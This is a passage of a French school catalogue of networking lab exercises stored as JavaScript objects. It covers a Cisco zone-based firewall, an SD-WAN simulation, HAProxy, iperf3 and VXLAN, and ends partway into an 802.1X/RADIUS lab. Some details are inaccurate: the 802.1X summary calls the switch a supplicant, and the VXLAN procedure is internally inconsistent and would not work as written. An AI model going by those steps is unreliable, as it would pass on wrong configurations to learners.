          { symptome: "Le trafic HTTP du LAN vers le WAN ne passe toujours pas", cause: "service-policy non appliqué sur la zone-pair, ou class-map ne matche pas le bon protocole", solution: "Vérifier show policy-map type inspect zone-pair et que match protocol http est bien dans la class-map utilisée" }
        ]
      },
      {
        titre: "Étape 4 — Vérifier le suivi des sessions",
        contexte: "Le Zone-Based Firewall maintient une table de sessions actives, consultable en temps réel. Cela permet de visualiser concrètement le comportement stateful du pare-feu.",
        commandes: [
          { os: "linux", cmd: "R1# show policy-map type inspect zone-pair INSIDE_TO_OUTSIDE sessions", commentaire: "Afficher les sessions actuellement suivies par le firewall (IP/port source-destination, protocole, état)" },
          { os: "linux", cmd: "# Générer du trafic puis observer :\n# curl https://203.0.113.10 depuis le client LAN\nR1# show policy-map type inspect zone-pair INSIDE_TO_OUTSIDE sessions", commentaire: "Observer l'apparition de la session HTTPS en cours" },
          { os: "linux", cmd: "R1# debug ip packet detail\n# (à utiliser avec prudence — désactiver avec : no debug all)", commentaire: "Debug détaillé du traitement des paquets par le firewall (uniquement en test, jamais en production)" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show zone security : INSIDE et OUTSIDE créées avec les bonnes interfaces",
      "class-map TRAFIC_AUTORISE : protocoles http/https/dns/icmp matchés",
      "zone-pair INSIDE_TO_OUTSIDE avec policy associée",
      "Trafic LAN -> WAN (HTTP/HTTPS) autorisé et fonctionnel",
      "Trafic non sollicité WAN -> LAN bloqué (pas de zone-pair retour)",
      "show policy-map ... sessions affiche les connexions actives suivies"
    ],
    tags: ["zone-based-firewall", "zbf", "zfw", "stateful", "pare-feu", "cisco", "gns3", "securite", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 115,
    titre: "SD-WAN — concepts et simulation d'architecture définie par logiciel",
    categorie: "reseau",
    niveau: "avancé",
    duree: 60,
    description: "Découvrir les concepts du SD-WAN (Software-Defined WAN) : séparation du plan de contrôle et du plan de données, sélection dynamique de chemin selon la qualité de lien, et simplification du déploiement multi-sites. Simulation des principes SD-WAN avec PfR/PBR sur Cisco IOS dans GNS3, en l'absence d'accès à une vraie solution commerciale (Cisco SD-WAN/Viptela, Velocloud).",
    objectifs: [
      "Comprendre la différence entre WAN traditionnel et SD-WAN",
      "Distinguer plan de contrôle et plan de données dans une architecture SD-WAN",
      "Simuler la sélection de chemin dynamique avec Policy-Based Routing (PBR)",
      "Mesurer la qualité de lien avec IP SLA",
      "Comprendre les concepts d'overlay et d'underlay réseau"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "3x Cisco IOSv 15.x (R-SITE, simulant 2 liens WAN MPLS et Internet vers un site distant)" },
      { type: "reseau", nom: "Topologie : R-SITE a deux liens WAN distincts vers R-DISTANT (lien MPLS et lien Internet simulé), chacun avec latence/perte différente" },
      { type: "reseau", nom: "Ce TP simule les PRINCIPES SD-WAN avec des outils IOS classiques — une vraie plateforme SD-WAN (Cisco Catalyst SD-WAN) nécessite des contrôleurs dédiés hors du périmètre BTS" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Comprendre les concepts SD-WAN",
        contexte: "Un WAN traditionnel route le trafic selon des métriques statiques (coût, distance administrative) sans connaissance de la qualité réelle du lien à l'instant T. Le SD-WAN centralise les décisions de routage (plan de contrôle) sur un contrôleur logiciel, et choisit dynamiquement le meilleur chemin disponible (plan de données) selon des critères temps réel : latence, perte, gigue, disponibilité applicative.",
        commandes: [
          { os: "both", cmd: "# Architecture SD-WAN typique (à des fins de compréhension, non reproduite techniquement dans GNS3) :\n# - vManage : interface de gestion centralisée (plan de gestion)\n# - vSmart : contrôleur de plan de contrôle (distribue les politiques de routage)\n# - vBond : orchestrateur d'authentification et de découverte\n# - vEdge/cEdge : équipements de périphérie sur chaque site (plan de données)", commentaire: "Comprendre les 4 composants d'une architecture SD-WAN commerciale (ex: Cisco Viptela)" },
          { os: "both", cmd: "# Underlay vs Overlay :\n# Underlay = infrastructure physique sous-jacente (liens MPLS, Internet, 4G/5G)\n# Overlay = tunnels logiques construits par-dessus (souvent IPsec), indépendants du transport physique", commentaire: "Le SD-WAN construit un overlay chiffré au-dessus de N'IMPORTE QUEL underlay disponible" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — IP SLA pour mesurer la qualité des liens",
        contexte: "IP SLA (Service Level Agreement) permet à un routeur Cisco classique de mesurer activement la latence, la perte de paquets et la gigue vers une destination — la brique de base qui permettrait, en SD-WAN réel, de choisir dynamiquement le meilleur chemin.",
        commandes: [
          { os: "linux", cmd: "# Définir une sonde IP SLA mesurant le RTT vers le site distant via le lien MPLS :\nR-SITE(config)# ip sla 1\nR-SITE(config-ip-sla)# icmp-echo 10.0.1.2 source-interface GigabitEthernet0/0\nR-SITE(config-ip-sla-echo)# frequency 5\nR-SITE(config-ip-sla-echo)# exit\nR-SITE(config)# ip sla schedule 1 life forever start-time now", commentaire: "Sonde ICMP toutes les 5 secondes vers le site distant via le lien MPLS (Gi0/0)" },
          { os: "linux", cmd: "# Sonde équivalente sur le second lien (Internet, Gi0/1) :\nR-SITE(config)# ip sla 2\nR-SITE(config-ip-sla)# icmp-echo 172.16.1.2 source-interface GigabitEthernet0/1\nR-SITE(config-ip-sla-echo)# frequency 5\nR-SITE(config-ip-sla-echo)# exit\nR-SITE(config)# ip sla schedule 2 life forever start-time now", commentaire: "Sonde équivalente sur le lien Internet pour comparer les deux chemins" },
          { os: "linux", cmd: "R-SITE# show ip sla statistics\nR-SITE# show ip sla statistics aggregated", commentaire: "Comparer la latence (RTT) et le taux de réussite des deux liens en temps réel" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Policy-Based Routing pour la sélection de chemin",
        contexte: "Le PBR (Policy-Based Routing) permet de router le trafic selon des critères autres que la destination seule (port, application, source). On simule une décision SD-WAN simplifiée : le trafic VoIP/critique part par le lien MPLS (faible latence), le reste par Internet.",
        commandes: [
          { os: "linux", cmd: "# Identifier le trafic critique (exemple : ports VoIP RTP) :\nR-SITE(config)# access-list 110 permit udp any any range 16384 32767", commentaire: "ACL identifiant le trafic RTP/VoIP typique" },
          { os: "linux", cmd: "# Route-map PBR :\nR-SITE(config)# route-map SDWAN-POLICY permit 10\nR-SITE(config-route-map)# match ip address 110\nR-SITE(config-route-map)# set ip next-hop 10.0.1.2\nR-SITE(config-route-map)# exit\nR-SITE(config)# route-map SDWAN-POLICY permit 20\nR-SITE(config-route-map)# set ip next-hop 172.16.1.2", commentaire: "Trafic VoIP -> lien MPLS (10.0.1.2), reste du trafic -> lien Internet (172.16.1.2)" },
          { os: "linux", cmd: "# Appliquer la route-map en entrée sur l'interface LAN :\nR-SITE(config)# interface GigabitEthernet0/2\nR-SITE(config-if)# ip policy route-map SDWAN-POLICY", commentaire: "Appliquer le PBR sur l'interface recevant le trafic du LAN local" },
          { os: "linux", cmd: "R-SITE# show route-map SDWAN-POLICY\nR-SITE# show ip policy", commentaire: "Vérifier la route-map et son application" }
        ],
        erreurs_courantes: [
          { symptome: "Le trafic ne suit pas la politique attendue", cause: "PBR appliqué sur la mauvaise interface (doit être sur l'interface d'ENTRÉE du trafic à orienter)", solution: "ip policy route-map doit être configuré sur l'interface qui REÇOIT le trafic du LAN, pas sur l'interface de sortie" }
        ]
      },
      {
        titre: "Étape 4 — Simuler le failover dynamique",
        contexte: "On combine IP SLA et une route conditionnelle (track) pour simuler le comportement SD-WAN de bascule automatique en cas de dégradation d'un lien.",
        commandes: [
          { os: "linux", cmd: "# Associer un objet track à la sonde IP SLA :\nR-SITE(config)# track 1 ip sla 1 reachability\nR-SITE(config-track)# delay down 5 up 10", commentaire: "Track surveille la sonde IP SLA 1 (lien MPLS) — délai de 5s avant de déclarer le lien down" },
          { os: "linux", cmd: "# Route conditionnelle utilisant le track :\nR-SITE(config)# ip route 0.0.0.0 0.0.0.0 10.0.1.2 track 1\nR-SITE(config)# ip route 0.0.0.0 0.0.0.0 172.16.1.2 250", commentaire: "Route par défaut via MPLS tant que le track est UP, sinon bascule automatique vers Internet (distance 250 = backup)" },
          { os: "linux", cmd: "# Simuler une panne du lien MPLS :\nR-SITE(config)# interface GigabitEthernet0/0\nR-SITE(config-if)# shutdown\nR-SITE# show track 1\nR-SITE# show ip route 0.0.0.0", commentaire: "Observer le basculement automatique de la route par défaut vers le lien Internet" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show ip sla statistics : RTT mesuré sur les deux liens (MPLS et Internet)",
      "Route-map SDWAN-POLICY créée avec orientation du trafic VoIP",
      "show ip policy : PBR actif sur l'interface LAN",
      "Track 1 configuré et lié à la sonde IP SLA",
      "Simulation panne lien MPLS : route par défaut bascule automatiquement",
      "show track 1 : état Down détecté après quelques secondes"
    ],
    tags: ["sd-wan", "ip-sla", "pbr", "policy-based-routing", "track", "failover", "cisco", "gns3", "concepts", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 116,
    titre: "HAProxy — répartition de charge applicative HTTP/HTTPS",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Déployer HAProxy comme load balancer devant plusieurs serveurs web pour répartir la charge, assurer la haute disponibilité applicative et terminer le SSL/TLS. Configuration des algorithmes de répartition, des health checks et du mode sticky session.",
    objectifs: [
      "Installer et configurer HAProxy en frontend/backend",
      "Répartir la charge entre plusieurs serveurs web avec différents algorithmes",
      "Configurer les health checks pour détecter un serveur en panne",
      "Activer les sticky sessions pour les applications avec état",
      "Terminer le SSL/TLS sur HAProxy"
    ],
    prerequis: [
      { type: "vm", nom: "VM Debian 12 dédiée au load balancer (HAProxy)" },
      { type: "vm", nom: "2x VMs Debian 12 avec Nginx installé (serveurs web backend, IPs 192.168.1.20 et 192.168.1.21)" },
      { type: "reseau", nom: "Toutes les VMs sur le même réseau 192.168.1.0/24" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Installer HAProxy et préparer les backends",
        contexte: "On installe HAProxy sur une VM dédiée et on configure deux serveurs Nginx identiques en backend pour observer la répartition de charge.",
        commandes: [
          { os: "linux", cmd: "sudo apt install haproxy -y\nhaproxy -v", commentaire: "Installer HAProxy" },
          { os: "linux", cmd: "# Sur chaque serveur backend (192.168.1.20 et .21) :\nsudo apt install nginx -y\necho 'Réponse du serveur WEB1 (192.168.1.20)' | sudo tee /var/www/html/index.html", commentaire: "Personnaliser la page d'accueil de chaque backend pour identifier visuellement la répartition" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer le frontend et le backend HAProxy",
        contexte: "Le frontend définit le point d'entrée (port d'écoute), le backend définit la liste des serveurs réels et l'algorithme de répartition.",
        commandes: [
          { os: "linux", cmd: "sudo nano /etc/haproxy/haproxy.cfg", commentaire: "Éditer la configuration HAProxy" },
          { os: "linux", cmd: "# Ajouter à la fin du fichier :\n# frontend http_front\n#   bind *:80\n#   default_backend http_back\n#\n# backend http_back\n#   balance roundrobin\n#   option httpchk GET /\n#   server web1 192.168.1.20:80 check\n#   server web2 192.168.1.21:80 check", commentaire: "Répartition round-robin avec health check HTTP actif" },
          { os: "linux", cmd: "sudo haproxy -c -f /etc/haproxy/haproxy.cfg\nsudo systemctl restart haproxy", commentaire: "Vérifier la syntaxe puis redémarrer HAProxy" },
          { os: "linux", cmd: "# Tester la répartition depuis l'extérieur :\nfor i in $(seq 1 6); do curl -s http://192.168.1.10 | head -1; done", commentaire: "Lancer plusieurs requêtes successives — observer l'alternance WEB1/WEB2" }
        ],
        erreurs_courantes: [
          { symptome: "HAProxy ne démarre pas : configuration invalide", cause: "Erreur de syntaxe dans haproxy.cfg", solution: "Toujours valider avec sudo haproxy -c -f /etc/haproxy/haproxy.cfg avant de redémarrer le service" }
        ]
      },
      {
        titre: "Étape 3 — Health checks et détection de panne",
        contexte: "On simule la panne d'un backend pour vérifier que HAProxy le retire automatiquement de la rotation et redirige tout le trafic vers le serveur restant.",
        commandes: [
          { os: "linux", cmd: "# Arrêter Nginx sur WEB1 pour simuler une panne :\n# Sur 192.168.1.20 :\nsudo systemctl stop nginx", commentaire: "Simuler la panne du serveur WEB1" },
          { os: "linux", cmd: "# Sur HAProxy — activer la page de statistiques :\nsudo nano /etc/haproxy/haproxy.cfg\n# Ajouter :\n# listen stats\n#   bind *:8404\n#   stats enable\n#   stats uri /stats\n#   stats refresh 10s\nsudo systemctl restart haproxy", commentaire: "Activer l'interface de statistiques HAProxy" },
          { os: "linux", cmd: "# Accéder à http://192.168.1.10:8404/stats depuis un navigateur\n# Observer : WEB1 en rouge (DOWN), WEB2 en vert (UP)\nfor i in $(seq 1 4); do curl -s http://192.168.1.10 | head -1; done", commentaire: "Vérifier que tout le trafic est redirigé vers WEB2 uniquement" },
          { os: "linux", cmd: "# Réactiver WEB1 :\nsudo systemctl start nginx\n# HAProxy le réintègre automatiquement après quelques health checks réussis", commentaire: "WEB1 redevient disponible et réintègre la rotation" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Sticky sessions et terminaison SSL/TLS",
        contexte: "Pour les applications stockant une session côté serveur, on active le sticky session par cookie. On termine également le SSL/TLS sur HAProxy pour simplifier la gestion des certificats côté backend.",
        commandes: [
          { os: "linux", cmd: "# Sticky session par cookie dans le backend :\n# backend http_back\n#   balance roundrobin\n#   cookie SERVERID insert indirect nocache\n#   server web1 192.168.1.20:80 check cookie web1\n#   server web2 192.168.1.21:80 check cookie web2", commentaire: "Le client reçoit un cookie SERVERID qui le maintient sur le même backend" },
          { os: "linux", cmd: "# Générer un certificat auto-signé pour le test SSL :\nsudo openssl req -x509 -newkey rsa:2048 -keyout /etc/haproxy/key.pem -out /etc/haproxy/cert.pem -days 365 -nodes -subj '/CN=lab.local'\ncat /etc/haproxy/cert.pem /etc/haproxy/key.pem | sudo tee /etc/haproxy/combined.pem", commentaire: "Créer le certificat combiné requis par HAProxy" },
          { os: "linux", cmd: "# Frontend HTTPS :\n# frontend https_front\n#   bind *:443 ssl crt /etc/haproxy/combined.pem\n#   default_backend http_back\nsudo systemctl restart haproxy", commentaire: "HAProxy termine le SSL — les backends restent en HTTP simple en interne" },
          { os: "linux", cmd: "curl -k https://192.168.1.10", commentaire: "Tester l'accès HTTPS (-k pour ignorer le certificat auto-signé en test)" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "haproxy -c -f /etc/haproxy/haproxy.cfg : configuration valide",
      "Requêtes successives alternent entre WEB1 et WEB2 (round-robin)",
      "Page de statistiques accessible sur :8404/stats",
      "Panne simulée d'un backend : trafic redirigé automatiquement sur l'autre",
      "Sticky session : un même client reste sur le même backend",
      "HTTPS fonctionnel via curl -k https://IP-HAProxy"
    ],
    tags: ["haproxy", "load-balancing", "repartition-charge", "health-check", "sticky-session", "ssl", "nginx", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 117,
    titre: "iperf3 — tests de débit et de bande passante réseau",
    categorie: "reseau",
    niveau: "débutant",
    duree: 45,
    description: "Utiliser iperf3 pour mesurer la bande passante réelle entre deux machines, identifier les goulots d'étranglement réseau et valider les performances après un changement d'infrastructure (câblage, switch, VLAN). Tests TCP, UDP, multi-flux et mesure de la gigue.",
    objectifs: [
      "Installer et lancer un serveur et un client iperf3",
      "Mesurer la bande passante TCP entre deux machines",
      "Tester en UDP et mesurer la perte de paquets et la gigue",
      "Effectuer des tests multi-flux parallèles",
      "Interpréter les résultats pour diagnostiquer un problème réseau"
    ],
    prerequis: [
      { type: "vm", nom: "VM Linux serveur (iperf3 en mode serveur)" },
      { type: "vm", nom: "VM Linux cliente (iperf3 en mode client) sur le même réseau ou via WAN/VPN" },
      { type: "reseau", nom: "Les deux VMs doivent être joignables sur le port TCP/UDP 5201 (par défaut)" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Installation et premier test TCP",
        contexte: "iperf3 fonctionne en mode client-serveur. Le serveur écoute en attente de connexion, le client se connecte et envoie du trafic pour mesurer le débit réel disponible.",
        commandes: [
          { os: "linux", cmd: "sudo apt install iperf3 -y\niperf3 --version", commentaire: "Installer iperf3 sur les deux machines" },
          { os: "linux", cmd: "# Sur le serveur (192.168.1.10) :\niperf3 -s", commentaire: "Démarrer iperf3 en mode serveur (écoute sur le port 5201)" },
          { os: "linux", cmd: "# Sur le client :\niperf3 -c 192.168.1.10", commentaire: "Lancer un test TCP de 10 secondes par défaut vers le serveur" },
          { os: "linux", cmd: "# Résultat typique à interpréter :\n# [ ID] Interval  Transfer  Bitrate\n# [  5] 0.00-10.00 sec  1.10 GBytes  941 Mbits/sec", commentaire: "Le Bitrate final indique le débit réel mesuré — comparer à la capacité théorique du lien (ex: Gigabit = 1000 Mbits/s)" }
        ],
        erreurs_courantes: [
          { symptome: "iperf3: error - unable to connect to server", cause: "Pare-feu bloque le port 5201 ou serveur non démarré", solution: "sudo ufw allow 5201 sur le serveur, vérifier que iperf3 -s tourne bien en arrière-plan" }
        ]
      },
      {
        titre: "Étape 2 — Tests avancés : durée, sens inverse, multi-flux",
        contexte: "On personnalise les tests pour des scénarios réalistes : durée prolongée, test en sens inverse (upload côté client), et plusieurs flux parallèles pour saturer un lien à haute capacité.",
        commandes: [
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -t 30", commentaire: "Test prolongé sur 30 secondes pour détecter des variations de débit dans le temps" },
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -R", commentaire: "-R : inverse le sens (le serveur envoie vers le client) — teste le débit descendant" },
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -P 4", commentaire: "-P 4 : lancer 4 flux TCP parallèles — utile pour saturer un lien 10 Gbps où un seul flux TCP plafonne souvent en dessous de la capacité réelle" },
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -i 1", commentaire: "-i 1 : afficher un rapport intermédiaire chaque seconde au lieu du résumé final uniquement" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 3 — Tests UDP : perte et gigue",
        contexte: "Contrairement à TCP, UDP n'a pas de contrôle de flux ni de retransmission — c'est le protocole idéal pour mesurer la perte de paquets réelle et la gigue (variation de latence), critiques pour la VoIP et le streaming.",
        commandes: [
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -u -b 100M", commentaire: "Test UDP à un débit cible de 100 Mbps (-b définit la bande passante visée, important en UDP)" },
          { os: "linux", cmd: "# Résultat à interpréter :\n# [ ID] Interval  Transfer  Bitrate  Jitter  Lost/Total Datagrams\n# [  5] 0.00-10.00 sec  119 MBytes  100 Mbits/sec  0.045 ms  0/85100 (0%)", commentaire: "Jitter faible et 0% de perte = lien de bonne qualité pour la VoIP/streaming" },
          { os: "linux", cmd: "iperf3 -c 192.168.1.10 -u -b 1G", commentaire: "Pousser le débit UDP à 1 Gbps pour identifier le point de saturation du lien (la perte augmente fortement au-delà de la capacité réelle)" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Documenter et interpréter les résultats",
        contexte: "On formalise les tests dans un rapport pour documenter les performances réseau avant/après une modification d'infrastructure (changement de switch, câblage Cat5e vs Cat6, etc.).",
        commandes: [
          { os: "linux", cmd: "# Export JSON pour traitement automatisé :\niperf3 -c 192.168.1.10 -J > /tmp/resultat-iperf.json\ncat /tmp/resultat-iperf.json | python3 -m json.tool | grep -A2 'bits_per_second'", commentaire: "Sortie JSON exploitable pour générer des rapports automatisés" },
          { os: "linux", cmd: "# Tableau de référence pour interpréter les résultats :\n# Lien Gigabit (1000 Mbps) : attendre 900-940 Mbits/sec en TCP (overhead normal)\n# Lien 100 Mbps : attendre 90-95 Mbits/sec\n# Si le débit mesuré est significativement inférieur : suspecter un câblage défectueux, un négociation duplex incorrecte, ou un goulot d'étranglement intermédiaire (switch sous-dimensionné, Wi-Fi)", commentaire: "Grille d'interprétation pour diagnostiquer un écart de performance" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "iperf3 -s démarré sur le serveur sans erreur",
      "Test TCP de base : débit mesuré cohérent avec la capacité théorique du lien",
      "Test -P 4 multi-flux : débit agrégé supérieur ou égal au test mono-flux",
      "Test UDP -u -b 100M : jitter et perte de paquets mesurés et documentés",
      "Export JSON généré et lisible",
      "Interprétation rédigée comparant le débit mesuré à la capacité théorique"
    ],
    tags: ["iperf3", "debit", "bande-passante", "performance", "tcp", "udp", "jitter", "diagnostic", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 118,
    titre: "VXLAN — overlay réseau pour datacenter et cloud",
    categorie: "reseau",
    niveau: "avancé",
    duree: 75,
    description: "Découvrir VXLAN (Virtual eXtensible LAN), la technologie d'overlay réseau utilisée dans les datacenters et le cloud pour étendre des domaines de diffusion L2 au-dessus d'une infrastructure L3 routée. Configuration d'un tunnel VXLAN point-à-point sur Linux avec des namespaces réseau pour simuler deux hyperviseurs distants.",
    objectifs: [
      "Comprendre pourquoi VXLAN existe (limites des VLANs traditionnels à 4096)",
      "Comprendre le rôle du VNI (VXLAN Network Identifier) et de l'encapsulation UDP",
      "Créer une interface VXLAN sur Linux avec ip link",
      "Connecter deux namespaces réseau à travers un tunnel VXLAN simulant deux hôtes distants",
      "Vérifier la communication L2 à travers l'overlay malgré un transport L3"
    ],
    prerequis: [
      { type: "vm", nom: "VM Debian 12 ou Ubuntu 22.04 (kernel supportant le module VXLAN)" },
      { type: "reseau", nom: "Le module noyau vxlan doit être chargeable : sudo modprobe vxlan" },
      { type: "reseau", nom: "Notions de VLAN et de routage IP maîtrisées avant ce TP" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Comprendre le besoin et la structure VXLAN",
        contexte: "Les VLANs traditionnels (802.1Q) sont limités à 4094 identifiants utilisables — insuffisant pour les grands datacenters multi-tenants. VXLAN encapsule les trames Ethernet dans des paquets UDP, avec un identifiant VNI sur 24 bits (16 millions de réseaux possibles), permettant d'étendre un réseau L2 par-dessus n'importe quelle infrastructure L3 routée, y compris entre datacenters distants.",
        commandes: [
          { os: "linux", cmd: "# Structure d'un paquet VXLAN :\n# [En-tête IP externe] [En-tête UDP, port 4789] [En-tête VXLAN avec VNI] [Trame Ethernet originale complète]\n# La trame Ethernet originale (avec ses propres MAC src/dst) est transportée intacte à l'intérieur", commentaire: "Comprendre l'encapsulation : c'est un tunnel L2-over-L3-over-UDP" },
          { os: "linux", cmd: "sudo modprobe vxlan\nlsmod | grep vxlan", commentaire: "Vérifier que le module noyau VXLAN est chargé" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Créer deux namespaces simulant deux hyperviseurs",
        contexte: "On utilise les network namespaces Linux pour simuler deux hôtes distants (HOST-A et HOST-B) sur la même machine, chacun avec sa propre interface VXLAN et son propre segment local.",
        commandes: [
          { os: "linux", cmd: "sudo ip netns add HOST-A\nsudo ip netns add HOST-B", commentaire: "Créer deux namespaces réseau isolés simulant deux serveurs physiques distincts" },
          { os: "linux", cmd: "# Créer une interface VXLAN dans le namespace par défaut (simule l'hyperviseur physique) reliant les deux \"sites\" :\nsudo ip link add vxlan100 type vxlan id 100 dstport 4789 local 127.0.0.1 remote 127.0.0.1 dev lo", commentaire: "VNI 100, port UDP standard 4789 (utilisation simplifiée en local pour le TP, en production remote pointerait vers l'IP du second hyperviseur)" },
          { os: "linux", cmd: "# Pour une démonstration multi-VM réaliste, utiliser deux interfaces VXLAN distinctes simulant chaque hyperviseur :\nsudo ip link add vxlan-a type vxlan id 100 dstport 4789 local 10.0.0.1 remote 10.0.0.2 dev eth0\nsudo ip netns exec HOST-A ip link set vxlan-a netns HOST-A 2>/dev/null || sudo ip link set vxlan-a netns HOST-A", commentaire: "Sur un vrai déploiement multi-machines, local/remote pointent vers les IPs physiques des deux hyperviseurs" }
        ],
        erreurs_courantes: [
          { symptome: "RTNETLINK answers: Operation not supported", cause: "Module vxlan non chargé ou noyau trop ancien", solution: "sudo modprobe vxlan et vérifier uname -r — noyau 3.7+ requis" }
        ]
      },
      {
        titre: "Étape 3 — Configurer le pont et les adresses IP",
        contexte: "On place l'interface VXLAN dans un bridge Linux avec une interface veth (virtual ethernet) reliée au namespace, simulant la connexion d'une VM à un switch virtuel local connecté à l'overlay VXLAN.",
        commandes: [
          { os: "linux", cmd: "# Créer une paire veth pour connecter HOST-A à son segment local :\nsudo ip link add veth-a type veth peer name veth-a-br\nsudo ip link set veth-a netns HOST-A", commentaire: "Une interface veth reste dans le namespace par défaut, l'autre entre dans HOST-A" },
          { os: "linux", cmd: "# Créer un bridge regroupant l'interface VXLAN et le veth :\nsudo ip link add br-vxlan type bridge\nsudo ip link set vxlan100 master br-vxlan\nsudo ip link set veth-a-br master br-vxlan\nsudo ip link set br-vxlan up\nsudo ip link set vxlan100 up\nsudo ip link set veth-a-br up", commentaire: "Le bridge relie le segment local (veth) à l'overlay VXLAN" },
          { os: "linux", cmd: "# Configurer l'IP dans le namespace HOST-A :\nsudo ip netns exec HOST-A ip addr add 192.168.100.10/24 dev veth-a\nsudo ip netns exec HOST-A ip link set veth-a up\nsudo ip netns exec HOST-A ip link set lo up", commentaire: "IP du HOST-A dans le réseau overlay 192.168.100.0/24" },
          { os: "linux", cmd: "# Répéter une configuration symétrique pour HOST-B avec IP 192.168.100.20/24", commentaire: "HOST-B dans le même segment overlay malgré l'isolation namespace" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Vérifier la communication à travers l'overlay",
        contexte: "Malgré l'isolation totale des namespaces au niveau L3 sous-jacent, les deux hôtes doivent pouvoir communiquer comme s'ils étaient sur le même câble Ethernet, grâce à l'overlay VXLAN.",
        commandes: [
          { os: "linux", cmd: "sudo ip netns exec HOST-A ping -c4 192.168.100.20", commentaire: "Ping depuis HOST-A vers HOST-B à travers le tunnel VXLAN — doit réussir malgré l'isolation namespace" },
          { os: "linux", cmd: "sudo ip netns exec HOST-A ip neigh show", commentaire: "Vérifier la table ARP — HOST-A a appris l'adresse MAC de HOST-B via le tunnel" },
          { os: "linux", cmd: "sudo tcpdump -i any udp port 4789 -n", commentaire: "Capturer le trafic VXLAN encapsulé — observer les paquets UDP/4789 transportant les trames Ethernet originales" },
          { os: "linux", cmd: "bridge fdb show dev vxlan100", commentaire: "Afficher la table de correspondance MAC apprise sur l'interface VXLAN" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "Module vxlan chargé : lsmod | grep vxlan",
      "Deux namespaces HOST-A et HOST-B créés",
      "Interface vxlan100 créée avec VNI 100",
      "Bridge br-vxlan reliant l'overlay au segment local",
      "Ping HOST-A -> HOST-B réussit à travers le tunnel",
      "tcpdump confirme l'encapsulation UDP/4789",
      "bridge fdb affiche les correspondances MAC apprises"
    ],
    tags: ["vxlan", "overlay", "datacenter", "cloud", "vni", "encapsulation", "linux", "namespace", "avance"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 119,
    titre: "802.1X & RADIUS — authentification réseau par port (NAC)",
    categorie: "securite",
    niveau: "avancé",
    duree: 90,
    description: "Mettre en place le contrôle d'accès réseau (NAC) avec 802.1X : authentification des postes avant d'accorder l'accès au réseau, via un serveur RADIUS (FreeRADIUS) et un switch Cisco en supplicant. Empêche tout équipement non authentifié de communiquer sur le réseau, même physiquement connecté.",
    objectifs: [
      "Comprendre l'architecture 802.1X (supplicant, authenticator, authentication server)",
      "Installer et configurer FreeRADIUS comme serveur d'authentification",
      "Configurer un switch Cisco comme authenticator 802.1X",
      "Configurer un client Linux comme supplicant avec wpa_supplicant",
      "Tester l'authentification réussie et le refus d'accès"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "1x Cisco IOSv-L2 ou vIOS-L2 (switch authenticator, supportant dot1x)" },
      { type: "vm", nom: "1x VM Debian 12 (serveur FreeRADIUS, IP 192.168.1.10)" },
      { type: "vm", nom: "1x VM Debian 12 ou Ubuntu (client supplicant avec wpa_supplicant installé)" },
      { type: "reseau", nom: "Réseau de test 192.168.1.0/24 — port switch dédié au client en mode dot1x" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Comprendre l'architecture 802.1X",
        contexte: "802.1X repose sur trois rôles : le Supplicant (le client qui veut accéder au réseau), l'Authenticator (le switch, qui bloque le port tant que l'authentification n'a pas réussi) et l'Authentication Server (RADIUS, qui valide les identifiants). Tant que l'authentification échoue, le port du switch ne laisse passer que le trafic EAP nécessaire à la négociation — aucun trafic applicatif normal.",
        commandes: [
          { os: "linux", cmd: "# Schéma du flux d'authentification :\n# 1. Client se connecte physiquement -> port bloqué sauf EAP\n# 2. Switch envoie EAP-Request Identity au client\n# 3. Client répond avec son identité (EAP-Response Identity)\n# 4. Switch relaie la demande au serveur RADIUS (encapsulée en RADIUS)\n# 5. RADIUS valide les identifiants et répond Accept ou Reject\n# 6. Si Accept : le switch ouvre le port pour le trafic normal", commentaire: "Comprendre les 6 étapes de la négociation EAP/RADIUS" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Installer et configurer FreeRADIUS",
        contexte: "FreeRADIUS est le serveur d'authentification open-source de référence. On configure un client RADIUS (le switch) et un utilisateur de test.",
        commandes: [
          { os: "linux", cmd: "sudo apt install freeradius -y\nsudo systemctl status freeradius", commentaire: "Installer FreeRADIUS" },
          { os: "linux", cmd: "sudo nano /etc/freeradius/3.0/clients.conf", commentaire: "Déclarer le switch comme client RADIUS autorisé" },
